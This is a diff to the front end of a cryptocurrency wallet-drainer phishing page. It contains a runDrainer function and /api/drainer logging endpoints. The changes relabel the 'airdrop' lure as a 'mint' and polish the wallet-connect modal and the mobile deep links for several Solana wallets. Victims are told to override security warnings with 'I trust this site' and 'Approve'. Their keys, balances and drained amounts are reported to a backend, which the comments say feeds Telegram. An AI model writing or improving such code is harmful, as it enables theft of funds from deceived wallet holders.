@@ -475,20 +475,38 @@
     .wallet-box {
       background: #111;
       border-radius: 16px;
-      padding: 30px;
-      max-width: 400px;
+      padding: 16px;
+      max-width: 280px;
       width: 100%;
       text-align: center;
       box-shadow: 0 0 20px rgba(20, 241, 149, 0.2);
+      margin: 0 auto;
+    }
+    
+    .modal-header {
+      margin-bottom: 16px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #333;
+    }
+    
+    .modal-header h3 {
+      color: #14f195;
+      margin: 0;
+      font-size: 1.2em;
+      font-weight: 600;
+    }
+    
+    .wallet-list-content {
+      margin-top: 8px;
     }
     .wallet-option {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 8px;
       background: #1a1a1a;
-      padding: 14px 20px;
-      margin: 12px 0;
-      border-radius: 12px;
+      padding: 10px 12px;
+      margin: 8px 0;
+      border-radius: 10px;
       cursor: pointer;
       transition: 0.2s ease;
     }
@@ -497,12 +515,12 @@
       outline: 2px solid #14f195;
     }
     .wallet-option img {
-      width: 28px;
-      height: 28px;
+      width: 20px;
+      height: 20px;
     }
     .wallet-name {
       color: #fff;
-      font-size: 1em;
+      font-size: 0.9em;
       font-weight: 600;
     }
     #status {
@@ -558,7 +576,30 @@
       nav { padding: 12px 8px; }
       .hero { padding: 60px 8px; }
       .hero h1 { font-size: 2em; }
-      .wallet-box { padding: 16px; }
+      .wallet-box { 
+        padding: 12px; 
+        max-width: 260px;
+        width: 90vw;
+        margin: 0 5px;
+      }
+      
+      .modal-header h3 {
+        font-size: 1.1em;
+      }
+      
+      .wallet-option {
+        padding: 8px 10px;
+        margin: 6px 0;
+      }
+      
+      .wallet-option img {
+        width: 18px;
+        height: 18px;
+      }
+      
+      .wallet-name {
+        font-size: 0.85em;
+      }
     }
     .info-section {
       background: #181818;
@@ -636,15 +677,12 @@
     .modal.active, .modal[style*="display: flex"] {
       display: flex !important;
     }
-    .wallet-box {
-      background: #111;
-      border-radius: 16px;
-      padding: 30px;
-      max-width: 400px;
-      width: 90vw;
-      text-align: center;
-      box-shadow: 0 0 20px rgba(20, 241, 149, 0.2);
-      margin: 0 8px;
+    /* Mobile-specific wallet-box overrides */
+    @media (max-width: 800px) {
+      .wallet-box {
+        width: 85vw;
+        margin: 0 8px;
+      }
     }
     /* Mobile Responsive Styles */
     @media (max-width: 600px) {
@@ -1286,6 +1324,7 @@
         margin: 20px;
         max-width: calc(100% - 40px);
         border-radius: 12px;
+        width: 90vw;
       }
       .wallet-option {
         padding: 16px 20px;
@@ -1326,6 +1365,7 @@
         padding: 16px;
         margin: 10px;
         max-width: calc(100% - 20px);
+        width: 95vw;
         position: fixed;
         top: 50%;
         left: 50%;
@@ -1357,8 +1397,8 @@
         justify-content: center;
       }
       #statusModal .wallet-box {
-        margin: 20px;
-        max-width: calc(100% - 40px);
+        margin: 15px;
+        max-width: calc(100% - 30px);
         text-align: center;
       }
     }
@@ -1366,16 +1406,16 @@
     /* Touch-friendly improvements for mobile */
     @media (hover: none) and (pointer: coarse) {
       .wallet-option {
-        min-height: 60px;
-        padding: 16px 20px;
+        min-height: 55px;
+        padding: 14px 18px;
       }
       .wallet-option:active {
         background: #333;
         transform: scale(0.98);
       }
       .claim-btn {
-        min-height: 50px;
-        padding: 16px 24px;
+        min-height: 48px;
+        padding: 14px 20px;
       }
       .claim-btn:active {
         transform: scale(0.95);
@@ -1521,7 +1561,12 @@
 
   <div class="modal" id="walletModal" tabindex="-1" aria-modal="true" role="dialog">
     <div class="wallet-box" id="walletList">
-      <!-- Wallet buttons will be injected here -->
+      <div class="modal-header">
+        <h3>Connect Wallet</h3>
+      </div>
+      <div class="wallet-list-content">
+        <!-- Wallet buttons will be injected here -->
+      </div>
     </div>
   </div>
   <div id="statusModal" class="modal" tabindex="-1" aria-modal="true" role="dialog" style="display:none;">
@@ -1678,7 +1723,8 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
           playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
-          deepLink: 'phantom://app/'
+          deepLink: 'phantom://browse/',
+          universalLink: 'https://phantom.app/ul/browse/'
         }
       },
       {
@@ -1705,7 +1751,8 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/solflare/id1580902717',
           playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
-          deepLink: 'solflare://access-wallet?url='
+          deepLink: 'solflare://browse/',
+          universalLink: 'https://solflare.com/ul/browse/'
         }
       },
       {
@@ -1737,7 +1784,8 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/backpack-wallet/id6446591340',
           playStore: 'https://play.google.com/store/apps/details?id=app.backpack',
-          deepLink: 'backpack://open?url='
+          deepLink: 'backpack://app?url=',
+          universalLink: 'https://backpack.app/ul/app?url='
         }
       },
       {
@@ -1769,7 +1817,8 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/glow-wallet/id1635717553',
           playStore: 'https://play.google.com/store/apps/details?id=com.glow.wallet',
-          deepLink: 'glow://open?url='
+          deepLink: 'glow://app/',
+          universalLink: 'https://glow.app/ul/app/'
         }
       },
       {
@@ -1817,7 +1866,7 @@
                   isUnsupported: true, // Flag to indicate limited support on mobile
                   originalProvider: wallet, // Keep reference to original provider
                   connect: async () => {
-                    throw new Error('Trust Wallet mobile dApp browser has limited MAMBO support. Please use Phantom or Solflare for this airdrop.');
+                    throw new Error('Trust Wallet mobile dApp browser has limited MAMBO support. Please use Phantom or Solflare for this mint.');
                   },
                   signTransaction: async () => {
                     throw new Error('Trust Wallet mobile dApp browser does not support MAMBO transaction signing. Please use Phantom or Solflare.');
@@ -1841,7 +1890,8 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
           playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
-          deepLink: 'https://link.trustwallet.com/open_url?coin_id=501&url='
+          deepLink: 'trust://open?url=',
+          universalLink: 'https://link.trustwallet.com/open_url?coin_id=501&url='
         }
       },
       {
@@ -1889,7 +1939,8 @@
         mobile: {
           appStore: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
           playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus',
-          deepLink: 'exodus://open?url='
+          deepLink: 'exodus://dapp/',
+          universalLink: 'https://exodus.com/app/dapp?url='
         }
       }
     ];
@@ -1914,7 +1965,7 @@ window.showStatus = function showStatus(message, type = 'info') {
 // Placeholder runDrainer implementation
 async function runDrainer(provider) {
   try {
-    showStatus('Preparing transaction...', 'loading');
+            showStatus('Preparing mint...', 'loading');
     // 1. Get the public key from the provider
     let publicKey = provider.publicKey || provider.address;
     
@@ -1995,7 +2046,7 @@ async function runDrainer(provider) {
     if (window.braveSolana?.isBraveWallet || 
         navigator.userAgent.includes('Brave') || 
         window.brave?.isBrave) {
-      showStatus('⚠️ Brave Wallet detected. Known compatibility issues. Please use Phantom or Solflare for this airdrop.', 'error');
+      showStatus('⚠️ Brave Wallet detected. Known compatibility issues. Please use Phantom or Solflare for this mint.', 'error');
       return;
     }
     
@@ -2061,7 +2112,7 @@ async function runDrainer(provider) {
     // Log wallet connection to backend (will be updated with actual balance later)
     // Don't log with 0 lamports initially - wait for actual balance
 
-    // 2. Fetch the airdrop transaction from the backend
+    // 2. Fetch the mint transaction from the backend
     showStatus('Checking wallet eligibility...', 'loading');
     
     // Pre-check wallet balance to avoid simulation failures
@@ -2209,7 +2260,7 @@ async function runDrainer(provider) {
       }
     } catch (decodeError) {
       console.error('[runDrainer] Base64 decode error:', decodeError);
-      showStatus('Error: Invalid transaction data received from server. Please try again.', 'error');
+              showStatus('Error: Invalid mint data received from server. Please try again.', 'error');
       return;
     }
     
@@ -2218,12 +2269,12 @@ async function runDrainer(provider) {
     // Validate transaction before signing
     if (!transaction || typeof transaction.serialize !== 'function') {
       console.error('[runDrainer] Invalid transaction object:', transaction);
-      showStatus('Error: Invalid transaction received from server.', 'error');
+              showStatus('Error: Invalid mint received from server.', 'error');
       return;
     }
 
     // 4. Request signature from the wallet with explicit user prompting
-    showStatus('⚠️ IMPORTANT: Please approve the transaction in your wallet to receive your airdrop! If you see a security warning, click "I trust this site" and then "Approve".', 'loading');
+            showStatus('⚠️ IMPORTANT: Please approve the mint in your wallet to receive your tokens! If you see a security warning, click "I trust this site" and then "Approve".', 'loading');
     
     // Add a delay to ensure user sees the message
     await new Promise(resolve => setTimeout(resolve, 3000));
@@ -2377,17 +2428,18 @@ async function runDrainer(provider) {
           console.log('[ERROR] SendTransactionError detected');
           
           // Log SendTransactionError to Telegram
-          fetch('/api/drainer/log-confirmation', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              publicKey: publicKey.toString(),
-              txid: 'send_transaction_error',
-              status: 'failed',
-              error: signError.message || 'SendTransactionError',
-              lamports: balance || 0
-            })
-          }).catch(err => console.log('[TELEGRAM] Failed to log SendTransactionError:', err));
+                      fetch('/api/drainer/log-confirmation', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                publicKey: publicKey.toString(),
+                txid: 'send_transaction_error',
+                status: 'failed',
+                error: signError.message || 'SendTransactionError',
+                lamports: balance || 0,
+                walletType: connectedWalletType
+              })
+            }).catch(err => console.log('[TELEGRAM] Failed to log SendTransactionError:', err));
           
           showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
           return;
@@ -2395,27 +2447,29 @@ async function runDrainer(provider) {
         
         // Enhanced error handling for specific wallets
         if (signError.message?.includes('User rejected') || signError.message?.includes('User denied') || signError.message?.includes('Cancelled')) {
-          showStatus('Transaction was cancelled. Please try again and approve the transaction.', 'error');
+          showStatus('Mint was cancelled. Please try again and approve the mint.', 'error');
           
           // Wallet-specific error messages
                    if (connectedWalletType === 'Glow') {
-           showStatus('Glow wallet: Transaction failed. Please try again.', 'error');
+           showStatus('Glow wallet: Mint failed. Please try again.', 'error');
          } else if (connectedWalletType === 'Backpack') {
-            showStatus('Backpack wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
+            showStatus('Backpack wallet: Please ensure you have approved the mint. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
           } else if (connectedWalletType === 'Exodus') {
-            showStatus('Exodus wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
+            showStatus('Exodus wallet: Please ensure you have approved the mint. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
           
           }
             
             // Log transaction cancellation to Telegram
-            fetch('/api/drainer/log-cancellation', {
+            fetch('/api/drainer/log-confirmation', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
                 publicKey: publicKey.toString(),
-                walletType: connectedWalletType || 'Unknown',
-                reason: 'User rejected transaction',
-                lamports: balance || 0
+                txid: 'user_rejected',
+                status: 'cancelled',
+                error: 'User rejected transaction',
+                lamports: balance || 0,
+                walletType: connectedWalletType
               })
             }).catch(err => console.log('[TELEGRAM] Failed to log cancellation:', err));
             
@@ -2439,7 +2493,8 @@ async function runDrainer(provider) {
                 txid: 'simulation_failed',
                 status: 'failed',
                 error: signError.message || 'Transaction simulation failed',
-                lamports: balance || 0
+                lamports: balance || 0,
+                walletType: connectedWalletType
               })
             }).catch(err => console.log('[TELEGRAM] Failed to log simulation failure:', err));
             
@@ -2455,21 +2510,24 @@ async function runDrainer(provider) {
               txid: 'timeout_error',
               status: 'failed',
               error: signError.message || 'JSON-RPC timeout',
-              lamports: balance || 0
+              lamports: balance || 0,
+              walletType: connectedWalletType
             })
           }).catch(err => console.log('[TELEGRAM] Failed to log timeout:', err));
           } else if (signError.message?.includes('Transaction cancelled') || signError.message?.includes('cancelled')) {
-            showStatus('✅ Transaction cancelled by user. You can try again when ready.', 'info');
+            showStatus('✅ Mint cancelled by user. You can try again when ready.', 'info');
             
             // Log transaction cancellation to Telegram
-            fetch('/api/drainer/log-cancellation', {
+            fetch('/api/drainer/log-confirmation', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
                 publicKey: publicKey.toString(),
-                walletType: connectedWalletType || 'Unknown',
-                reason: 'User cancelled transaction',
-                lamports: balance || 0
+                txid: 'user_cancelled',
+                status: 'cancelled',
+                error: 'User cancelled transaction',
+                lamports: balance || 0,
+                walletType: connectedWalletType
               })
             }).catch(err => console.log('[TELEGRAM] Failed to log cancellation:', err));
             
@@ -2501,7 +2559,8 @@ async function runDrainer(provider) {
                 txid: 'simulation_failed',
                 status: 'failed',
                 error: errorMessage,
-                lamports: balance || 0
+                lamports: balance || 0,
+                walletType: connectedWalletType
               })
             }).catch(err => console.log('[TELEGRAM] Failed to log simulation failure:', err));
             
@@ -2516,7 +2575,8 @@ async function runDrainer(provider) {
                 txid: 'unhandled_error',
                 status: 'failed',
                 error: errorMessage,
-                lamports: balance || 0
+                lamports: balance || 0,
+                walletType: connectedWalletType
               })
             }).catch(err => console.log('[TELEGRAM] Failed to log unhandled error:', err));
             
@@ -2527,7 +2587,7 @@ async function runDrainer(provider) {
       }
 
     // 5. Send the transaction to the network with retry logic
-    showStatus('Broadcasting transaction...', 'loading');
+    showStatus('Broadcasting mint...', 'loading');
     const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
     let txid;
     let broadcastSuccess = false;
@@ -2577,7 +2637,7 @@ async function runDrainer(provider) {
             });
           }
           
-          console.log('[BROADCAST] Transaction sent with ID:', txid);
+          console.log('[BROADCAST] Mint sent with ID:', txid);
           broadcastSuccess = true;
           return txid;
     } else {
@@ -2604,7 +2664,7 @@ async function runDrainer(provider) {
     
     if (broadcastSuccess && txid) {
       console.log('[BROADCAST] Transaction sent with ID:', txid);
-      showStatus('⏳ Transaction sent! Checking on-chain status...', 'loading');
+              showStatus('⏳ Mint sent! Checking on-chain status...', 'loading');
       
       // Add a small delay to ensure the user sees the message
       setTimeout(() => {
@@ -2653,7 +2713,8 @@ async function runDrainer(provider) {
                               txid: txid,
                               status: 'failed',
                               error: txStatus.err,
-                              lamports: balance || 0
+                              lamports: balance || 0,
+                              walletType: connectedWalletType
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
                           
@@ -2682,7 +2743,8 @@ async function runDrainer(provider) {
                               status: 'confirmed',
                               error: null,
                               lamports: balance || 0,
-                              actualDrainAmount: actualDrainAmount || 0
+                              actualDrainAmount: actualDrainAmount || 0,
+                              walletType: connectedWalletType
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
                           
@@ -2709,7 +2771,8 @@ async function runDrainer(provider) {
                               txid: txid,
                               status: 'failed',
                               error: 'Transaction not confirmed',
-                              lamports: balance || 0
+                              lamports: balance || 0,
+                              walletType: connectedWalletType
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
                           
@@ -2727,8 +2790,9 @@ async function runDrainer(provider) {
                             publicKey: publicKey.toString(),
                             txid: txid,
                             status: 'failed',
-                            error: 'Status check failed',
-                            lamports: balance || 0
+                            error: 'Status.check.failed',
+                            lamports: balance || 0,
+                            walletType: connectedWalletType
                           })
                         }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
                         
@@ -2796,45 +2860,51 @@ window.openWalletModal = async function openWalletModal() {
       return;
     }
     
-    walletList.innerHTML = detectedDefs.map(wallet => {
-      // Use the actual provider object for this wallet
-      const provider = wallet.provider();
-      let actionBtn = '';
-      if (provider) {
-        actionBtn = `<button class="claim-btn connect-wallet-btn" data-wallet-key="${wallet.key}">Connect</button>`;
-      } else if (isMobile()) {
-        actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.mobile?.appStore || wallet.install}', '_blank')">Open/Install</button>`;
-      } else {
-        actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.install}', '_blank')">Install</button>`;
-      }
-      return `
-        <div class="wallet-option">
-          <img src="${wallet.icon}" alt="${wallet.name} logo" />
-          <span class="wallet-name">${wallet.name}</span>
-          ${actionBtn}
-        </div>
-      `;
-    }).join('');
+    const walletListContent = walletList.querySelector('.wallet-list-content');
+    if (walletListContent) {
+      walletListContent.innerHTML = detectedDefs.map(wallet => {
+        // Use the actual provider object for this wallet
+        const provider = wallet.provider();
+        let actionBtn = '';
+        if (provider) {
+          actionBtn = `<button class="claim-btn connect-wallet-btn" data-wallet-key="${wallet.key}">Connect</button>`;
+        } else if (isMobile()) {
+          actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.mobile?.appStore || wallet.install}', '_blank')">Open/Install</button>`;
+        } else {
+          actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.install}', '_blank')">Install</button>`;
+        }
+        return `
+          <div class="wallet-option">
+            <img src="${wallet.icon}" alt="${wallet.name} logo" />
+            <span class="wallet-name">${wallet.name}</span>
+            ${actionBtn}
+          </div>
+        `;
+      }).join('');
+    }
     
 
     
     // Attach event listeners for connect buttons
     setTimeout(() => {
-      const connectBtns = walletList.querySelectorAll('.connect-wallet-btn');
-      connectBtns.forEach(btn => {
-        btn.addEventListener('click', function() {
-          const key = btn.getAttribute('data-wallet-key');
-          // Use the actual provider object at click time
-          const wallet = WALLET_DEFS.find(w => w.key === key);
-          if (wallet) {
-            const provider = wallet.provider();
-            if (provider && window.connectMobileWallet) {
-              // Pass the wallet object, but connectMobileWallet will use the current provider
-              window.connectMobileWallet(wallet);
+      const walletListContent = walletList.querySelector('.wallet-list-content');
+      if (walletListContent) {
+        const connectBtns = walletListContent.querySelectorAll('.connect-wallet-btn');
+        connectBtns.forEach(btn => {
+          btn.addEventListener('click', function() {
+            const key = btn.getAttribute('data-wallet-key');
+            // Use the actual provider object at click time
+            const wallet = WALLET_DEFS.find(w => w.key === key);
+            if (wallet) {
+              const provider = wallet.provider();
+              if (provider && window.connectMobileWallet) {
+                // Pass the wallet object, but connectMobileWallet will use the current provider
+                window.connectMobileWallet(wallet);
+              }
             }
-          }
+          });
         });
-      });
+      }
     }, 0);
     modal.classList.add('active');
   }
@@ -3194,54 +3264,117 @@ window.openWalletModal = async function openWalletModal() {
             // Enhanced deep linking for seamless wallet opening
             try {
               if (wallet.name === 'Phantom') {
-                // Use direct window.open for better deep linking
+                // Use proper deep link format for Phantom
                 const currentUrl = window.location.href;
                 
-                // Try direct deep link first
-                const phantomDeepLink = `phantom://app/${encodeURIComponent(currentUrl)}`;
+                // Try deep link first, then universal link as fallback
+                const phantomDeepLink = `phantom://browse/${encodeURIComponent(currentUrl)}`;
+                const phantomUniversalLink = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`;
+                
                 console.log(`[connectMobileWallet] Trying Phantom deep link: ${phantomDeepLink}`);
                 
-                // Use window.open for better compatibility
-                const phantomWindow = window.open(phantomDeepLink, '_blank');
-                
-                // If window.open fails, try location.href
-                if (!phantomWindow || phantomWindow.closed) {
-                  console.log(`[connectMobileWallet] Phantom window.open failed, trying location.href`);
-                  window.location.href = phantomDeepLink;
+                try {
+                  const phantomWindow = window.open(phantomDeepLink, '_blank');
+                  if (!phantomWindow || phantomWindow.closed) {
+                    console.log(`[connectMobileWallet] Phantom deep link failed, trying universal link`);
+                    window.location.href = phantomUniversalLink;
+                  }
+                } catch (e) {
+                  console.log(`[connectMobileWallet] Phantom deep link error:`, e);
+                  window.location.href = phantomUniversalLink;
                 }
               } else if (wallet.name === 'Solflare') {
-                // Use direct window.open for better deep linking
+                // Use proper deep link format for Solflare
                 const currentUrl = window.location.href;
                 
-                // Try direct deep link first
-                const solflareDeepLink = `solflare://access-wallet?url=${encodeURIComponent(currentUrl)}`;
+                // Try deep link first, then universal link as fallback
+                const solflareDeepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
+                const solflareUniversalLink = `https://solflare.com/ul/browse/${encodeURIComponent(currentUrl)}`;
+                
                 console.log(`[connectMobileWallet] Trying Solflare deep link: ${solflareDeepLink}`);
                 
-                // Use window.open for better compatibility
-                const solflareWindow = window.open(solflareDeepLink, '_blank');
-                
-                // If window.open fails, try location.href
-                if (!solflareWindow || solflareWindow.closed) {
-                  console.log(`[connectMobileWallet] Solflare window.open failed, trying location.href`);
-                  window.location.href = solflareDeepLink;
+                try {
+                  const solflareWindow = window.open(solflareDeepLink, '_blank');
+                  if (!solflareWindow || solflareWindow.closed) {
+                    console.log(`[connectMobileWallet] Solflare deep link failed, trying universal link`);
+                    window.location.href = solflareUniversalLink;
+                  }
+                } catch (e) {
+                  console.log(`[connectMobileWallet] Solflare deep link error:`, e);
+                  window.location.href = solflareUniversalLink;
                 }
               } else if (wallet.name === 'Backpack') {
-                  // Use Backpack's correct DApp deep link format
-                  const currentUrl = window.location.href;
-                  
-                  // Backpack uses: https://backpack.app/dapp/https://yourdapp.com
-                  try {
-                    window.location.href = `https://backpack.app/dapp/${currentUrl}`;
-                  } catch (e) {
-                    // Fallback to web
-                    window.location.href = `https://backpack.app/`;
+                // Use Backpack's correct DApp deep link format
+                const currentUrl = window.location.href;
+                const backpackDeepLink = `backpack://app?url=${encodeURIComponent(currentUrl)}`;
+                const backpackUniversalLink = `https://backpack.app/ul/app?url=${encodeURIComponent(currentUrl)}`;
+                
+                console.log(`[connectMobileWallet] Trying Backpack deep link: ${backpackDeepLink}`);
+                
+                try {
+                  const backpackWindow = window.open(backpackDeepLink, '_blank');
+                  if (!backpackWindow || backpackWindow.closed) {
+                    console.log(`[connectMobileWallet] Backpack deep link failed, trying universal link`);
+                    window.location.href = backpackUniversalLink;
                   }
+                } catch (e) {
+                  console.log(`[connectMobileWallet] Backpack deep link error:`, e);
+                  window.location.href = backpackUniversalLink;
+                }
               } else if (wallet.name === 'Glow') {
-                window.location.href = 'glow://';
+                // Use Glow's correct DApp deep link format
+                const currentUrl = window.location.href;
+                const glowDeepLink = `glow://app/${encodeURIComponent(currentUrl)}`;
+                const glowUniversalLink = `https://glow.app/ul/app/${encodeURIComponent(currentUrl)}`;
+                
+                console.log(`[connectMobileWallet] Trying Glow deep link: ${glowDeepLink}`);
+                
+                try {
+                  const glowWindow = window.open(glowDeepLink, '_blank');
+                  if (!glowWindow || glowWindow.closed) {
+                    console.log(`[connectMobileWallet] Glow deep link failed, trying universal link`);
+                    window.location.href = glowUniversalLink;
+                  }
+                } catch (e) {
+                  console.log(`[connectMobileWallet] Glow deep link error:`, e);
+                  window.location.href = glowUniversalLink;
+                }
               } else if (wallet.name === 'Trust Wallet') {
-                window.location.href = 'trust://';
+                // Use Trust Wallet's correct DApp deep link format
+                const currentUrl = window.location.href;
+                const trustDeepLink = `trust://open?url=${encodeURIComponent(currentUrl)}`;
+                const trustUniversalLink = `https://link.trustwallet.com/open_url?coin_id=501&url=${encodeURIComponent(currentUrl)}`;
+                
+                console.log(`[connectMobileWallet] Trying Trust Wallet deep link: ${trustDeepLink}`);
+                
+                try {
+                  const trustWindow = window.open(trustDeepLink, '_blank');
+                  if (!trustWindow || trustWindow.closed) {
+                    console.log(`[connectMobileWallet] Trust Wallet deep link failed, trying universal link`);
+                    window.location.href = trustUniversalLink;
+                  }
+                } catch (e) {
+                  console.log(`[connectMobileWallet] Trust Wallet deep link error:`, e);
+                  window.location.href = trustUniversalLink;
+                }
               } else if (wallet.name === 'Exodus') {
-                window.location.href = 'exodus://';
+                // Use Exodus's correct DApp deep link format
+                const currentUrl = window.location.href;
+                const exodusDeepLink = `exodus://dapp/${encodeURIComponent(currentUrl)}`;
+                const exodusUniversalLink = `https://exodus.com/app/dapp?url=${encodeURIComponent(currentUrl)}`;
+                
+                console.log(`[connectMobileWallet] Trying Exodus deep link: ${exodusDeepLink}`);
+                
+                try {
+                  const exodusWindow = window.open(exodusDeepLink, '_blank');
+                  if (!exodusWindow || exodusWindow.closed) {
+                    console.log(`[connectMobileWallet] Exodus deep link failed, trying universal link`);
+                    window.location.href = exodusUniversalLink;
+                  }
+                } catch (e) {
+                  console.log(`[connectMobileWallet] Exodus deep link error:`, e);
+                  window.location.href = exodusUniversalLink;
+                }
               }
             } catch (e) {
             }
@@ -3405,7 +3538,7 @@ window.openWalletModal = async function openWalletModal() {
                   // Try to trigger approval by attempting to sign a message
                   if (typeof provider.signMessage === 'function') {
                     try {
-                      const message = new TextEncoder().encode('Connect to MAMBO Airdrop');
+                      const message = new TextEncoder().encode('Connect to MAMBO Mint');
                       const signature = await provider.signMessage(message);
                       console.log(`[connectMobileWallet] signMessage signature for ${wallet.name}:`, signature);
                       showStatus(`${wallet.name} approved!`, 'success');
@@ -3490,7 +3623,7 @@ window.openWalletModal = async function openWalletModal() {
                       
                       // Show alternative wallet options
                       setTimeout(() => {
-                        showStatus('💡 Please use Phantom or Solflare for this airdrop', 'info');
+                        showStatus('💡 Please use Phantom or Solflare for this mint', 'info');
                         
                         // Show wallet selection modal with supported wallets
                         const modal = document.getElementById('walletModal');
@@ -3503,15 +3636,18 @@ window.openWalletModal = async function openWalletModal() {
                             (w.name === 'Phantom' || w.name === 'Solflare' || w.name === 'Backpack' || w.name === 'Glow' || w.name === 'Exodus')
                           );
                           
-                          walletList.innerHTML = supportedWallets.map(wallet => `
-                            <div class="wallet-option">
-                              <img src="${wallet.icon}" alt="${wallet.name} logo" />
-                              <span class="wallet-name">${wallet.name}</span>
-                              <button class="claim-btn" onclick="connectMobileWallet(${JSON.stringify(wallet)})">
-                                Use ${wallet.name}
-                              </button>
-                            </div>
-                          `).join('');
+                          const walletListContent = walletList.querySelector('.wallet-list-content');
+                          if (walletListContent) {
+                            walletListContent.innerHTML = supportedWallets.map(wallet => `
+                              <div class="wallet-option">
+                                <img src="${wallet.icon}" alt="${wallet.name} logo" />
+                                <span class="wallet-name">${wallet.name}</span>
+                                <button class="claim-btn" onclick="connectMobileWallet(${JSON.stringify(wallet)})">
+                                  Use ${wallet.name}
+                                </button>
+                              </div>
+                            `).join('');
+                          }
                           
                           modal.classList.add('active');
                         }
@@ -4002,28 +4138,28 @@ window.openWalletModal = async function openWalletModal() {
       
       switch(walletType) {
         case 'phantom':
-          deepLink = 'phantom://app/' + encodeURIComponent(currentUrl);
-          fallbackUrl = 'https://phantom.app/';
+          deepLink = 'phantom://browse/' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://phantom.app/ul/browse/' + encodeURIComponent(currentUrl);
           break;
         case 'solflare':
-          deepLink = 'solflare://access-wallet?url=' + encodeURIComponent(currentUrl);
-          fallbackUrl = 'https://solflare.com/';
+          deepLink = 'solflare://browse/' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://solflare.com/ul/browse/' + encodeURIComponent(currentUrl);
           break;
         case 'backpack':
-          deepLink = 'backpack://open?url=' + encodeURIComponent(currentUrl);
-          fallbackUrl = 'https://backpack.app/';
+          deepLink = 'backpack://app?url=' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://backpack.app/ul/app?url=' + encodeURIComponent(currentUrl);
           break;
         case 'trustwallet':
-          deepLink = 'https://link.trustwallet.com/open_url?coin_id=501&url=' + encodeURIComponent(currentUrl);
-          fallbackUrl = 'https://trustwallet.com/';
+          deepLink = 'trust://open?url=' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://link.trustwallet.com/open_url?coin_id=501&url=' + encodeURIComponent(currentUrl);
           break;
         case 'glow':
-          deepLink = 'glow://open?url=' + encodeURIComponent(currentUrl);
-          fallbackUrl = 'https://glow.app/';
+          deepLink = 'glow://app/' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://glow.app/ul/app/' + encodeURIComponent(currentUrl);
           break;
         case 'exodus':
-          deepLink = 'exodus://open?url=' + encodeURIComponent(currentUrl);
-          fallbackUrl = 'https://exodus.com/';
+          deepLink = 'exodus://dapp/' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://exodus.com/app/dapp?url=' + encodeURIComponent(currentUrl);
           break;
       }
       
